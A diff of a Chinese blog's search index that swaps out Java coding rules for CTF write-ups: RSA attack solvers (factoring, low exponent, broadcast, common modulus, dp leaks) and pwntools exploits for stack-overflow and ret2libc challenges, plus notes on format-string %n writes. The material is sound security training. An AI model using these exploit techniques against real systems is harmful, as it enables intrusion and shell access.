-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line">public static final int MIN_DATA = 1;</span><br><span class="line">public static final int MAX_DATA = 99;</span><br><span class="line">public static final String STR_SUM = &quot;岗位评分结果为=&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">private void printSum() &#123;</span><br><span class="line">System.out.println(STR_SUM+(MIN_DATA+MAX_DATA));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="TODO规范">TODO规范</h4>
-<p>用来描述已知待改进，待补充的修改点，加上作者名称</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// TODO &lt;“作者名称”&gt;: 补充XX处理</span><br></pre></td></tr></table></figure>
-<h4 id="方法参数规范">方法参数规范</h4>
-<p>每个方法最多三个参数，超出三个要封装成javabean对象</p>
-<h4 id="SysLog日志注解使用">@SysLog日志注解使用</h4>
-<p>接口涉及增删改数据时必须使用@SysLog注解。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ApiOperation(value = &quot;权限配置-修改用户角色&quot;,notes = &quot;权限配置-修改用户角色&quot;)</span></span><br><span class="line"><span class="meta">@SysLog(&quot;权限配置-修改用户角色&quot;)</span></span><br><span class="line"><span class="meta">@PutMapping(value = &quot;/editUserRole&quot;)</span></span><br><span class="line"><span class="keyword">public</span> R&lt;Boolean&gt; <span class="title function_">saveUserRole</span><span class="params">(<span class="meta">@RequestBody</span> UserDTO userDTO)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(userDTO.getUserId() == <span class="literal">null</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> R.failed(Boolean.FALSE).setMsg(<span class="string">&quot;用户id不能为空&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> R.ok(userService.saveUserRole(userDTO));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h3 id="工程框架规范">工程框架规范</h3>
-<h4 id="应用分层">应用分层</h4>
-<p>代码分层为MVC方式，<strong>不能</strong>用DDD方式修改代码目录结构</p>
-<h4 id="依赖包管理版本规范">依赖包管理版本规范</h4>
-<p>基础平台父工程hdp已经引入绝大部分开发所需maven 依赖包，如果需要增加依赖包必须先征得架构师同意。业务项目<strong>不得重复添加已有依赖包</strong>，所添加依赖包版本必须<strong>与基础平台依赖包版本一致</strong>，引入后必须<strong>处理依赖冲突</strong>。</p>
+<h4 id="n可以被直接分解"><a href="#n可以被直接分解" class="headerlink" title="n可以被直接分解"></a>n可以被直接分解</h4><p>例题：BUUCTF：[WUSTCTF2020]babyrsa</p>
+<p>附件给出c,n,e,此题的n不算太大，因此可以分解n为p,q,然后算出私钥d,即可解出答案</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = <span class="number">28767758880940662779934612526152562406674613203406706867456395986985664083182</span></span><br><span class="line">n = <span class="number">73069886771625642807435783661014062604264768481735145873508846925735521695159</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p=<span class="number">189239861511125143212536989589123569301</span></span><br><span class="line">q=<span class="number">386123125371923651191219869811293586459</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">d=gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;d=&quot;</span>,d)</span><br><span class="line"></span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
+<h4 id="低加密指数攻击-e很小"><a href="#低加密指数攻击-e很小" class="headerlink" title="低加密指数攻击 (e很小)"></a>低加密指数攻击 (e很小)</h4><p>特征，n很大但e很小</p>
+<p>例题：BUUCTF Dangrous RSA</p>
+<p>此题n太大了，分解不了，因此换一个思路，由于e 很小，则有条件$c=m^e+kn$ 。这样我们可以爆破这个k的值，让m可以开方，这样可以直接爆破出密文</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n=<span class="number">0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793</span></span><br><span class="line"></span><br><span class="line">e=<span class="number">3</span></span><br><span class="line"></span><br><span class="line">c=<span class="number">0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 爆破函数，从k=0开始，逐步爆破，直到m可以被e开方</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">c, e, n</span>):</span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        m = c - n*k</span><br><span class="line">        result, flag = gmpy2.iroot(m, e) <span class="comment">#判断m开方e是否为整数，如是，则flag=True。</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">m=de(c,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
+<h4 id="低指数加密广播攻击"><a href="#低指数加密广播攻击" class="headerlink" title="低指数加密广播攻击"></a>低指数加密广播攻击</h4><p>特征:多组n，c，但是使用的是同一个e且e很小</p>
+<p>例题：BUUCTF RSA4</p>
+<p>多组n,c时考虑将n,c放入数组中，形式为n=[n1,n2,n3]，c=[c1,c2,c3]。然后使用sympy库中的中国剩余定理，这具体是个啥定理我目前也不太理解，但是调用crt(c,n)方法可以得出m的e次方，最后开方即可</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n1=<span class="built_in">int</span>(<span class="string">&#x27;331310324212000030020214312244232222400142410423413104441140203003243002104333214202031202212403400220031202142322434104143104244241214204444443323000244130122022422310201104411044030113302323014101331214303223312402430402404413033243132101010422240133122211400434023222214231402403403200012221023341333340042343122302113410210110221233241303024431330001303404020104442443120130000334110042432010203401440404010003442001223042211442001413004&#x27;</span>,<span class="number">5</span>)</span><br><span class="line">c1=<span class="built_in">int</span>(<span class="string">&#x27;310020004234033304244200421414413320341301002123030311202340222410301423440312412440240244110200112141140201224032402232131204213012303204422003300004011434102141321223311243242010014140422411342304322201241112402132203101131221223004022003120002110230023341143201404311340311134230140231412201333333142402423134333211302102413111111424430032440123340034044314223400401224111323000242234420441240411021023100222003123214343030122032301042243&#x27;</span>,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">n2=<span class="built_in">int</span>(<span class="string">&#x27;302240000040421410144422133334143140011011044322223144412002220243001141141114123223331331304421113021231204322233120121444434210041232214144413244434424302311222143224402302432102242132244032010020113224011121043232143221203424243134044314022212024343100042342002432331144300214212414033414120004344211330224020301223033334324244031204240122301242232011303211220044222411134403012132420311110302442344021122101224411230002203344140143044114&#x27;</span>,<span class="number">5</span>)</span><br><span class="line">c2=<span class="built_in">int</span>(<span class="string">&#x27;112200203404013430330214124004404423210041321043000303233141423344144222343401042200334033203124030011440014210112103234440312134032123400444344144233020130110134042102220302002413321102022414130443041144240310121020100310104334204234412411424420321211112232031121330310333414423433343322024400121200333330432223421433344122023012440013041401423202210124024431040013414313121123433424113113414422043330422002314144111134142044333404112240344&#x27;</span>,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">n3=<span class="built_in">int</span>(<span class="string">&#x27;332200324410041111434222123043121331442103233332422341041340412034230003314420311333101344231212130200312041044324431141033004333110021013020140020011222012300020041342040004002220210223122111314112124333211132230332124022423141214031303144444134403024420111423244424030030003340213032121303213343020401304243330001314023030121034113334404440421242240113103203013341231330004332040302440011324004130324034323430143102401440130242321424020323&#x27;</span>,<span class="number">5</span>)</span><br><span class="line">c3=<span class="built_in">int</span>(<span class="string">&#x27;10013444120141130322433204124002242224332334011124210012440241402342100410331131441303242011002101323040403311120421304422222200324402244243322422444414043342130111111330022213203030324422101133032212042042243101434342203204121042113212104212423330331134311311114143200011240002111312122234340003403312040401043021433112031334324322123304112340014030132021432101130211241134422413442312013042141212003102211300321404043012124332013240431242&#x27;</span>,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">e=<span class="number">1</span></span><br><span class="line">n=[n1,n2,n3]</span><br><span class="line">c=[c1,c2,c3]</span><br><span class="line">result,mod=crt(n,c)</span><br><span class="line"><span class="comment">#这里我爆破e的值，如果开方成功则输出答案</span></span><br><span class="line"><span class="keyword">while</span> e&lt;<span class="number">1000</span>:</span><br><span class="line">    value, is_perfect = gmpy2.iroot(result, e)</span><br><span class="line">    <span class="keyword">if</span> is_perfect==<span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(value))</span><br><span class="line">    e+=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<h4 id="公因数攻击"><a href="#公因数攻击" class="headerlink" title="公因数攻击"></a>公因数攻击</h4><p>特征：很多组n,c</p>
+<p>例题：BUUCTF RSA5</p>
+<p>题目给出了e和贼多组n，c。因此考虑公因数攻击，当有很多组n时，有可能出现两个n之间存在公因数的情况。又因为n是由指数p*q,因此得到公因数就等于得到了p和q，则题目可解</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n1 = <span class="number">20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207</span></span><br><span class="line">c1 = <span class="number">974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320</span></span><br><span class="line"></span><br><span class="line">...........</span><br><span class="line"><span class="comment">#20组数据就不摆上来了</span></span><br><span class="line"></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n=[]</span><br><span class="line">c=[]</span><br><span class="line">p=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    n.append(<span class="built_in">eval</span>(<span class="string">&#x27;n&#x27;</span>+<span class="built_in">str</span>(i)))</span><br><span class="line">    c.append(<span class="built_in">eval</span>(<span class="string">&#x27;n&#x27;</span>+<span class="built_in">str</span>(i)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,<span class="built_in">len</span>(n)):</span><br><span class="line">        <span class="keyword">if</span> gmpy2.gcd(n[i],n[j])!=<span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;i=%d j=%d&quot;</span> %(i,j))</span><br><span class="line">            <span class="built_in">print</span>(gmpy2.gcd(n[i],n[j]))</span><br><span class="line"></span><br><span class="line">p=gmpy2.gcd(n5,n18)</span><br><span class="line">q=n18//p</span><br><span class="line"></span><br><span class="line">d=gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m=<span class="built_in">pow</span>(c18,d,n18)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
+<h4 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h4><p>特征:多组e，c，共用一个n，且e之间最好互质</p>
+<p>例题：BUUCTF [BJDCTF2020]rsa_output</p>
+<p>解法：当e1,e2互质时，他们的最大公因数为1，即gcd(e1,e2)=1。根据欧几里得拓展算法，可以得到一个有解的式子：$e1<em>x+e2</em>y=gcd(e1,e2)$ 。得到x,y之后，根据加密过程，化简式子可得:$m=(c1^x*c2^y)modn$。由此得到明文。</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n=<span class="number">21058339337354287847534107544613605305015441090508924094198816691219103399526800112802416383088995253908857460266726925615826895303377801614829364034624475195859997943146305588315939130777450485196290766249612340054354622516207681542973756257677388091926549655162490873849955783768663029138647079874278240867932127196686258800146911620730706734103611833179733264096475286491988063990431085380499075005629807702406676707841324660971173253100956362528346684752959937473852630145893796056675793646430793578265418255919376323796044588559726703858429311784705245069845938316802681575653653770883615525735690306674635167111</span></span><br><span class="line"></span><br><span class="line">e1=<span class="number">3659</span></span><br><span class="line">e2=<span class="number">2767</span></span><br><span class="line"></span><br><span class="line">c1=<span class="number">20152490165522401747723193966902181151098731763998057421967155300933719378216342043730801302534978403741086887969040721959533190058342762057359432663717825826365444996915469039056428416166173920958243044831404924113442512617599426876141184212121677500371236937127571802891321706587610393639446868836987170301813018218408886968263882123084155607494076330256934285171370758586535415136162861138898728910585138378884530819857478609791126971308624318454905992919405355751492789110009313138417265126117273710813843923143381276204802515910527468883224274829962479636527422350190210717694762908096944600267033351813929448599</span></span><br><span class="line">c2=<span class="number">11298697323140988812057735324285908480504721454145796535014418738959035245600679947297874517818928181509081545027056523790022598233918011261011973196386395689371526774785582326121959186195586069851592467637819366624044133661016373360885158956955263645614345881350494012328275215821306955212788282617812686548883151066866149060363482958708364726982908798340182288702101023393839781427386537230459436512613047311585875068008210818996941460156589314135010438362447522428206884944952639826677247819066812706835773107059567082822312300721049827013660418610265189288840247186598145741724084351633508492707755206886202876227</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_,x,y=gmpy2.gcdext(e1,e2)<span class="comment">#拓展欧几里得算法，得到x,y</span></span><br><span class="line"><span class="built_in">print</span>(gcd(e1,e2))<span class="comment">#查看e1,e2是否互质</span></span><br><span class="line"><span class="built_in">print</span>(x,y)</span><br><span class="line">m=<span class="built_in">pow</span>(c1,y,n)*<span class="built_in">pow</span>(c2,x,n)%n<span class="comment">#这里我就理解为x,y是密文解密的私钥了</span></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="dp泄露"><a href="#dp泄露" class="headerlink" title="dp泄露"></a>dp泄露</h4><p>特征：提供了dp，e，n，c</p>
+<p>例题：BUUCTF RSA2</p>
+<p>解析：这个题有点抽象，n不够大的情况下可以直接分解为p,q，然后求解私钥就能解了，没用到dp。</p>
+<p>当然我们先知道dp是什么，$dp=d\%(p-1)$ 。随后推导可以得到：$e<em>dp=1+k</em>(p-1)$。随后使用爆破求k的方式即可求出p，随后求出q，最后就能得到密钥d。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"> </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span></span><br><span class="line">dp = <span class="number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span></span><br><span class="line"> </span><br><span class="line">c = <span class="number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">    <span class="keyword">if</span> (dp * e - <span class="number">1</span>) % i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n % (((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span>) == <span class="number">0</span>:</span><br><span class="line">            p = ((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span></span><br><span class="line">            q = n // (((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span>)</span><br><span class="line">            d = gmpy2.invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">            m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
+<h4 id="dp-dq泄露"><a href="#dp-dq泄露" class="headerlink" title="dp,dq泄露"></a>dp,dq泄露</h4><p>特征：给出了dp,dq,则不需要e即可得出明文</p>
+<p>例题：BUUCTF RSA1</p>
+<p>解析：</p>
+<p>$m1 = c^{dp}modp$</p>
+<p>$m2 = c^{dq}modq$</p>
+<p>$m = (((m1-m2)<em>I)\%p)</em>q+m2$</p>
+<p>I表示p,q的逆元</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span></span><br><span class="line">q = <span class="number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span></span><br><span class="line"></span><br><span class="line">dp = <span class="number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span></span><br><span class="line">dq = <span class="number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span></span><br><span class="line"></span><br><span class="line">i=gmpy2.invert(p,q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;i=&quot;</span>,i)</span><br><span class="line"></span><br><span class="line">m1=<span class="built_in">pow</span>(c,dp,p)</span><br><span class="line">m2=<span class="built_in">pow</span>(c,dq,q)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m=(((m1-m2)*i)%q)*p+m2</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
 ]]></content>
-      <categories>
-        <category>编程语言</category>
-      </categories>
       <tags>
-        <tag>Java</tag>
-        <tag>常用规范</tag>
+        <tag>密码学</tag>
+        <tag>基础</tag>
       </tags>
   </entry>
   <entry>
     <title>pwn:从一窍不通到入门的门前</title>
     <url>/2022/07/06/pwn-%E4%BB%8E%E4%B8%80%E7%AA%8D%E4%B8%8D%E9%80%9A%E5%88%B0%E5%85%A5%E9%97%A8%E7%9A%84%E9%97%A8%E5%89%8D/</url>
-    <content><![CDATA[<p>基础pwn例题，栈溢出，格式化字符串。</p>
+    <content><![CDATA[<p> 基础pwn例题，栈溢出，格式化字符串。</p>
 <span id="more"></span>
-<h3 id="栈溢出例题">栈溢出例题</h3>
-<h4 id="hello-pwn">hello_pwn</h4>
-<p>来源：攻防世界</p>
+<h3 id="栈溢出例题"><a href="#栈溢出例题" class="headerlink" title="栈溢出例题"></a>栈溢出例题</h3><h4 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h4><p>来源：攻防世界</p>
 <p>首先先checksec：</p>
 <p><img src="https://i.niupic.com/images/2022/09/04/a51X.png" alt=""></p>
 <p>再看伪代码：</p>
@@ -248,8 +109,7 @@
 <p>这里基本就明白了：当dowrd_60106C=1853186401时，执行下面的sub函数，sub函数就直接得出flag了，因此只要再前一步的read函数那里创造栈溢出，再人为满足条件判断即可。</p>
 <p>exp:</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./hello_pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;111.200.241.244&#x27;,52016)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h4 id="level3">level3</h4>
-<p>来源：攻防世界</p>
+<h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h4><p>来源：攻防世界</p>
 <p>checksec:</p>
 <p><img src="https://i.niupic.com/images/2022/09/04/a520.png" alt=""></p>
 <p>32位程序，开启堆栈不可执行，这是一道构造ROP的经典例题。</p>
@@ -257,7 +117,7 @@
 <p>源码看出漏洞还是栈溢出，但是此时找不到现成的system函数和binsh字符串。</p>
 <p>因此要找到system函数，知识点(搬运自wiki)</p>
 <ul>
-<li>system 函数属于 libc，而 <a href="http://libc.so">libc.so</a> 动态链接库中的函数之间相对偏移是固定的。</li>
+<li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li>
 <li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。</li>
 <li>查找Libc的网址：<a href="https://libc.blukat.me/">https://libc.blukat.me/</a>和<a href="https://libc.rip/">https://libc.rip/</a></li>
 </ul>
@@ -268,8 +128,7 @@
 <p>这样输出之后我们就得到了write函数的真实地址了，再通过libc来求得system和binsh的真实地址，最后第二次调动程序，再次利用漏洞，就可以得到shell。</p>
 <p>exp：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./level3&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="number">59245</span>)</span><br><span class="line"></span><br><span class="line">padding=<span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_got_addr=u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(write_got_addr)</span><br><span class="line"></span><br><span class="line">libc_write=libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_base=write_got_addr-libc_write</span><br><span class="line"></span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the system address is:&#x27;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_bin=<span class="built_in">next</span>(libc.search(<span class="string">b&quot;bin/sh&quot;</span>))//找到binsh偏移的方法</span><br><span class="line">bin_addr=libc_base+libc_bin</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;the binsh address is:&quot;</span>,<span class="built_in">hex</span>(bin_addr))</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*padding+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h3 id="格式化字符串">格式化字符串</h3>
-<p>基本原理以及利用方法在wiki上有解释。</p>
+<h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>基本原理以及利用方法在wiki上有解释。</p>
 <p>&lt;<a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">原理介绍 - CTF Wiki (ctf-wiki.org)</a>&gt;</p>
 <p>主要意思是利用printf一类函数漏洞，当函数没有严格规定格式化字符串时，攻击者可以控制printf函数来输出其他内容，由于格式化字符串输出的是栈上内容，因此此漏洞可以找到栈上其他位置的信息，比如地址，数据。总结一下就是：超出的每一个格式化字符串都能对下一格栈空间造成影响。</p>
 <p>%d:打印成数字，只能泄露栈本身内容</p>
@@ -277,11 +136,10 @@
 <p>%s:识别栈上内容为指针，打印出该指针指向的位置，这里有可能造成任意地址的泄露（只要能控制栈并完成布局）</p>
 <p>%c:输出字符</p>
 <p>%n:把前面已经打印的长度<strong>写入</strong>某个内存地址(实现任意地址写入)</p>
-<p>%n:写入4个字节，写入1–&gt;0000 0001</p>
-<p>%hn:写入两个字节，写入1–&gt;0001</p>
-<p>%hhn:写入单个字节,写入1–&gt;01</p>
-<h3 id="整数溢出">整数溢出</h3>
-<p>啥都没有，因为懒得搞，搞堆去了</p>
+<p>%n:写入4个字节，写入1—&gt;0000 0001</p>
+<p>%hn:写入两个字节，写入1—&gt;0001</p>
+<p>%hhn:写入单个字节,写入1—&gt;01</p>
+<h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3><p>啥都没有，因为懒得搞，搞堆去了</p>
 <p><img src="https://i.niupic.com/images/2022/09/04/a51S.jpg" alt=""></p>
 ]]></content>
       <categories>
@@ -293,78 +151,260 @@
       </tags>
   </entry>
   <entry>
+    <title>Java入门基础</title>
+    <url>/2022/07/02/Java%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<p> Java初学，包含使用IDEA创建文件，基本程序等等</p>
+<span id="more"></span>
+<h4 id="创建新的程序"><a href="#创建新的程序" class="headerlink" title="创建新的程序"></a>创建新的程序</h4><p><img src="https://i.niupic.com/images/2022/09/04/a51W.png" alt=""></p>
+<p>如上图，创建一个JAVA程序的步骤依次向下创建，注意一个工程可以包含多个模块，一个模块可以包含多个包，一个包可以包含多个类。</p>
+<h4 id="字面量-数据格式"><a href="#字面量-数据格式" class="headerlink" title="字面量(数据格式)"></a>字面量(数据格式)</h4><p>字符：用单引号括起来</p>
+<p>字符串：用双引号括起来</p>
+<p>空值：null</p>
+<p>特殊字符：\n:换行符，\t:缩进符</p>
+<p>默认整数是Int型，小数是double型，需要改变在数据后加上L/F。</p>
